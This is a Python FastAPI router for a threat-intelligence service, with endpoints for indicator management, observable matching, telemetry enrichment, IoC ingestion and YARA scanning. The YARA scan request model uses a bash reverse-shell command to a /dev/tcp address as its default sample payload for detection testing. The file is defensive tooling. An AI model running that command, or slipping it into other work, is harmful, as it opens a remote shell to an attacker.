"""
Gestiva Security (GestivaSec V1) — SPRINT 9: Threat Intelligence & Enrichment REST API Router
Exposes comprehensive REST API for Threat Indicators, Exact Matching, Telemetry Enrichment, YARA Scanning, and IoCs.
"""
from typing import List, Dict, Any, Optional
from fastapi import APIRouter, HTTPException, Query, Header
from pydantic import BaseModel, Field

from backend.application.threat_intel_service import ThreatIntelApplicationService
from backend.domain.threat_intel_engine import (
    ThreatIndicator,
    IndicatorType,
    IndicatorStatus,
    ReputationScore,
    IndicatorOfCompromise
)

router = APIRouter(tags=["Threat Intelligence & Enrichment Engine"])
ti_service = ThreatIntelApplicationService()

# --- REQUEST / DTO MODELS ---
class CreateIndicatorRequest(BaseModel):
    indicator_type: str = Field("IP_ADDRESS", json_schema_extra={"example": "IP_ADDRESS"})
    indicator_value: str = Field("198.51.100.200", json_schema_extra={"example": "198.51.100.200"})
    source: str = Field("INTERNAL", json_schema_extra={"example": "INTERNAL"})
    confidence: float = Field(0.95, json_schema_extra={"example": 0.95})
    severity: str = Field("HIGH", json_schema_extra={"example": "HIGH"})
    reputation: str = Field("MALICIOUS", json_schema_extra={"example": "MALICIOUS"})
    tags: List[str] = Field(default_factory=list)
    mitre_techniques: List[str] = Field(default_factory=list)

class UpdateIndicatorRequest(BaseModel):
    confidence: Optional[float] = None
    severity: Optional[str] = None
    reputation: Optional[str] = None
    tags: Optional[List[str]] = None

class ObservableDTO(BaseModel):
    type: str = Field("IP_ADDRESS", json_schema_extra={"example": "IP_ADDRESS"})
    value: str = Field("198.51.100.200", json_schema_extra={"example": "198.51.100.200"})

class MatchRequest(BaseModel):
    observables: List[ObservableDTO]
    entity_type: str = Field("NORMALIZED_EVENT", json_schema_extra={"example": "NORMALIZED_EVENT"})
    entity_id: str = Field("evt-1001", json_schema_extra={"example": "evt-1001"})

class EnrichRequest(BaseModel):
    entity_type: str = Field("NORMALIZED_EVENT", json_schema_extra={"example": "NORMALIZED_EVENT"})
    entity_id: str = Field("evt-1001", json_schema_extra={"example": "evt-1001"})
    observables: List[ObservableDTO]

class ThreatIndicatorDTO(BaseModel):
    indicator_id: str
    organization_id: str
    indicator_type: str
    indicator_value: str
    normalized_value: str
    source: str
    confidence: float
    severity: str
    reputation: str
    status: str
    tags: List[str]
    mitre_techniques: List[str]
    created_at: str

class MatchDTO(BaseModel):
    match_id: str
    indicator_id: str
    observable_type: str
    observable_value: str
    matched_entity_type: str
    matched_entity_id: str
    match_type: str
    confidence: float
    reputation: str
    source: str
    matched_at: str

class EnrichmentDTO(BaseModel):
    enrichment_id: str
    entity_type: str
    entity_id: str
    matches: List[MatchDTO]
    composite_threat_score: float
    threat_grade: str
    enriched_at: str

# Legacy DTOs
class IngestIoCRequest(BaseModel):
    ioc_type: str = Field("IP_REPUTATION", json_schema_extra={"example": "IP_REPUTATION"})
    value: str = Field("198.51.100.200", json_schema_extra={"example": "198.51.100.200"})
    threat_score: float = Field(95.0, json_schema_extra={"example": 95.0})
    threat_actor: str = Field("APT29_COZY_BEAR", json_schema_extra={"example": "APT29_COZY_BEAR"})
    confidence: float = Field(0.98, json_schema_extra={"example": 0.98})
    category: str = Field("C2_SERVER", json_schema_extra={"example": "C2_SERVER"})

class IoCDTO(BaseModel):
    ioc_id: str
    ioc_type: str
    value: str
    threat_score: float
    threat_actor: str
    confidence: float
    category: str
    created_at: str

class YaraScanRequest(BaseModel):
    payload: str = Field("/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", json_schema_extra={"example": "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"})

class YaraMatchDTO(BaseModel):
    rule_name: str
    matched_strings: List[str]
    severity: str
    description: str


# --- THREAT INTEL REST ENDPOINTS ---
@router.post("/api/v1/threat-intel/indicators", response_model=ThreatIndicatorDTO, status_code=201)
async def create_indicator(req: CreateIndicatorRequest, x_organization_id: Optional[str] = Header(None, alias="X-Organization-ID")):
    """Creates a new Threat Indicator."""
    org_id = x_organization_id or "GLOBAL"
    ind = await ti_service.create_indicator(
        organization_id=org_id,
        indicator_type=req.indicator_type,
        indicator_value=req.indicator_value,
        source=req.source,
        confidence=req.confidence,
        severity=req.severity,
        reputation=req.reputation,
        tags=req.tags,
        mitre_techniques=req.mitre_techniques
    )
    return ThreatIndicatorDTO(
        indicator_id=ind.indicator_id,
        organization_id=ind.organization_id,
        indicator_type=ind.indicator_type,
        indicator_value=ind.indicator_value,
        normalized_value=ind.normalized_value,
        source=ind.source,
        confidence=ind.confidence,
        severity=ind.severity,
        reputation=ind.reputation,
        status=ind.status,
        tags=ind.tags,
        mitre_techniques=ind.mitre_techniques,
        created_at=ind.created_at.isoformat()
    )

@router.get("/api/v1/threat-intel/indicators", response_model=List[ThreatIndicatorDTO])
async def list_indicators(x_organization_id: Optional[str] = Header(None, alias="X-Organization-ID")):
    """Lists indicators for tenant (GLOBAL + tenant-specific)."""
    org_id = x_organization_id or "GLOBAL"
    indicators = ti_service.list_indicators(org_id)
    return [
        ThreatIndicatorDTO(
            indicator_id=ind.indicator_id,
            organization_id=ind.organization_id,
            indicator_type=ind.indicator_type,
            indicator_value=ind.indicator_value,
            normalized_value=ind.normalized_value,
            source=ind.source,
            confidence=ind.confidence,
            severity=ind.severity,
            reputation=ind.reputation,
            status=ind.status,
            tags=ind.tags,
            mitre_techniques=ind.mitre_techniques,
            created_at=ind.created_at.isoformat()
        ) for ind in indicators
    ]

@router.get("/api/v1/threat-intel/indicators/{indicator_id}", response_model=ThreatIndicatorDTO)
async def get_indicator(indicator_id: str):
    """Retrieves a single indicator by ID."""
    ind = ti_service.get_indicator(indicator_id)
    if not ind:
        raise HTTPException(status_code=404, detail="Threat Indicator not found.")
    return ThreatIndicatorDTO(
        indicator_id=ind.indicator_id,
        organization_id=ind.organization_id,
        indicator_type=ind.indicator_type,
        indicator_value=ind.indicator_value,
        normalized_value=ind.normalized_value,
        source=ind.source,
        confidence=ind.confidence,
        severity=ind.severity,
        reputation=ind.reputation,
        status=ind.status,
        tags=ind.tags,
        mitre_techniques=ind.mitre_techniques,
        created_at=ind.created_at.isoformat()
    )

@router.patch("/api/v1/threat-intel/indicators/{indicator_id}", response_model=ThreatIndicatorDTO)
async def update_indicator(indicator_id: str, req: UpdateIndicatorRequest):
    """Updates indicator parameters."""
    ind = ti_service.get_indicator(indicator_id)
    if not ind:
        raise HTTPException(status_code=404, detail="Threat Indicator not found.")
    if req.confidence is not None: ind.confidence = req.confidence
    if req.severity is not None: ind.severity = req.severity.upper()
    if req.reputation is not None: ind.reputation = req.reputation.upper()
    if req.tags is not None: ind.tags = req.tags
    return ThreatIndicatorDTO(
        indicator_id=ind.indicator_id,
        organization_id=ind.organization_id,
        indicator_type=ind.indicator_type,
        indicator_value=ind.indicator_value,
        normalized_value=ind.normalized_value,
        source=ind.source,
        confidence=ind.confidence,
        severity=ind.severity,
        reputation=ind.reputation,
        status=ind.status,
        tags=ind.tags,
        mitre_techniques=ind.mitre_techniques,
        created_at=ind.created_at.isoformat()
    )

@router.post("/api/v1/threat-intel/indicators/{indicator_id}/disable", response_model=ThreatIndicatorDTO)
async def disable_indicator(indicator_id: str):
    """Disables a threat indicator (soft lifecycle change)."""
    ind = await ti_service.disable_indicator(indicator_id)
    if not ind:
        raise HTTPException(status_code=404, detail="Threat Indicator not found.")
    return ThreatIndicatorDTO(
        indicator_id=ind.indicator_id,
        organization_id=ind.organization_id,
        indicator_type=ind.indicator_type,
        indicator_value=ind.indicator_value,
        normalized_value=ind.normalized_value,
        source=ind.source,
        confidence=ind.confidence,
        severity=ind.severity,
        reputation=ind.reputation,
        status=ind.status,
        tags=ind.tags,
        mitre_techniques=ind.mitre_techniques,
        created_at=ind.created_at.isoformat()
    )

@router.post("/api/v1/threat-intel/indicators/{indicator_id}/revoke", response_model=ThreatIndicatorDTO)
async def revoke_indicator(indicator_id: str):
    """Revokes a threat indicator."""
    ind = await ti_service.revoke_indicator(indicator_id)
    if not ind:
        raise HTTPException(status_code=404, detail="Threat Indicator not found.")
    return ThreatIndicatorDTO(
        indicator_id=ind.indicator_id,
        organization_id=ind.organization_id,
        indicator_type=ind.indicator_type,
        indicator_value=ind.indicator_value,
        normalized_value=ind.normalized_value,
        source=ind.source,
        confidence=ind.confidence,
        severity=ind.severity,
        reputation=ind.reputation,
        status=ind.status,
        tags=ind.tags,
        mitre_techniques=ind.mitre_techniques,
        created_at=ind.created_at.isoformat()
    )

@router.get("/api/v1/threat-intel/lookup/{indicator_type}/{indicator_value}", response_model=ThreatIndicatorDTO)
async def lookup_indicator(indicator_type: str, indicator_value: str, x_organization_id: Optional[str] = Header(None, alias="X-Organization-ID")):
    """Performs real-time exact match lookup on indicator type & value (< 0.5ms)."""
    org_id = x_organization_id or "GLOBAL"
    ind = ti_service.lookup_indicator(indicator_type, indicator_value, org_id)
    if not ind:
        raise HTTPException(status_code=404, detail=f"Indicator {indicator_value} of type {indicator_type} not found.")
    return ThreatIndicatorDTO(
        indicator_id=ind.indicator_id,
        organization_id=ind.organization_id,
        indicator_type=ind.indicator_type,
        indicator_value=ind.indicator_value,
        normalized_value=ind.normalized_value,
        source=ind.source,
        confidence=ind.confidence,
        severity=ind.severity,
        reputation=ind.reputation,
        status=ind.status,
        tags=ind.tags,
        mitre_techniques=ind.mitre_techniques,
        created_at=ind.created_at.isoformat()
    )

@router.post("/api/v1/threat-intel/match", response_model=List[MatchDTO])
async def match_observables(req: MatchRequest, x_organization_id: Optional[str] = Header(None, alias="X-Organization-ID")):
    """Matches a list of observables against active Threat Indicators."""
    org_id = x_organization_id or "GLOBAL"
    obs_dicts = [{"type": o.type, "value": o.value} for o in req.observables]
    matches = await ti_service.match_observables(
        observables=obs_dicts,
        entity_type=req.entity_type,
        entity_id=req.entity_id,
        organization_id=org_id
    )
    return [
        MatchDTO(
            match_id=m.match_id,
            indicator_id=m.indicator_id,
            observable_type=m.observable_type,
            observable_value=m.observable_value,
            matched_entity_type=m.matched_entity_type,
            matched_entity_id=m.matched_entity_id,
            match_type=m.match_type,
            confidence=m.confidence,
            reputation=m.reputation,
            source=m.source,
            matched_at=m.matched_at.isoformat()
        ) for m in matches
    ]

@router.post("/api/v1/threat-intel/enrich", response_model=EnrichmentDTO)
async def enrich_entity(req: EnrichRequest, x_organization_id: Optional[str] = Header(None, alias="X-Organization-ID")):
    """Enriches security telemetry with Threat Intelligence matches."""
    org_id = x_organization_id or "GLOBAL"
    obs_dicts = [{"type": o.type, "value": o.value} for o in req.observables]
    matches = await ti_service.match_observables(
        observables=obs_dicts,
        entity_type=req.entity_type,
        entity_id=req.entity_id,
        organization_id=org_id
    )
    enrichment = ti_service.enrich_entity(req.entity_type, req.entity_id, matches)
    return EnrichmentDTO(
        enrichment_id=enrichment.enrichment_id,
        entity_type=enrichment.entity_type,
        entity_id=enrichment.entity_id,
        matches=[
            MatchDTO(
                match_id=m.match_id,
                indicator_id=m.indicator_id,
                observable_type=m.observable_type,
                observable_value=m.observable_value,
                matched_entity_type=m.matched_entity_type,
                matched_entity_id=m.matched_entity_id,
                match_type=m.match_type,
                confidence=m.confidence,
                reputation=m.reputation,
                source=m.source,
                matched_at=m.matched_at.isoformat()
            ) for m in enrichment.matches
        ],
        composite_threat_score=enrichment.composite_threat_score,
        threat_grade=enrichment.threat_grade,
        enriched_at=enrichment.enriched_at.isoformat()
    )


# --- BACKWARD COMPATIBILITY ENDPOINTS (/api/v1/threat-intel/engine) ---
@router.post("/api/v1/threat-intel/engine/iocs", response_model=IoCDTO)
async def ingest_ioc_feed_data(payload: IngestIoCRequest):
    ioc = IndicatorOfCompromise(
        ioc_type=payload.ioc_type.upper(),
        value=payload.value,
        threat_score=payload.threat_score,
        threat_actor=payload.threat_actor,
        confidence=payload.confidence,
        category=payload.category.upper()
    )
    added = ti_service.ingest_ioc(ioc)
    return IoCDTO(
        ioc_id=added.ioc_id,
        ioc_type=added.ioc_type,
        value=added.value,
        threat_score=added.threat_score,
        threat_actor=added.threat_actor,
        confidence=added.confidence,
        category=added.category,
        created_at=added.created_at.isoformat()
    )

@router.get("/api/v1/threat-intel/engine/iocs/lookup", response_model=IoCDTO)
async def lookup_ioc_details(
    ioc_type: str = Query("IP_REPUTATION", json_schema_extra={"example": "IP_REPUTATION"}),
    value: str = Query("198.51.100.200", json_schema_extra={"example": "198.51.100.200"})
):
    match = ti_service.lookup_ioc(ioc_type, value)
    if not match:
        raise HTTPException(status_code=404, detail=f"IoC {value} not found in Threat Intel feeds.")
    return IoCDTO(
        ioc_id=match.ioc_id,
        ioc_type=match.ioc_type,
        value=match.value,
        threat_score=match.threat_score,
        threat_actor=match.threat_actor,
        confidence=match.confidence,
        category=match.category,
        created_at=match.created_at.isoformat()
    )

@router.post("/api/v1/threat-intel/engine/yara/scan", response_model=List[YaraMatchDTO])
async def execute_yara_scan(req: YaraScanRequest):
    matches = ti_service.scan_payload_yara(req.payload)
    return [
        YaraMatchDTO(
            rule_name=m.rule_name,
            matched_strings=m.matched_strings,
            severity=m.severity,
            description=m.description
        ) for m in matches
    ]
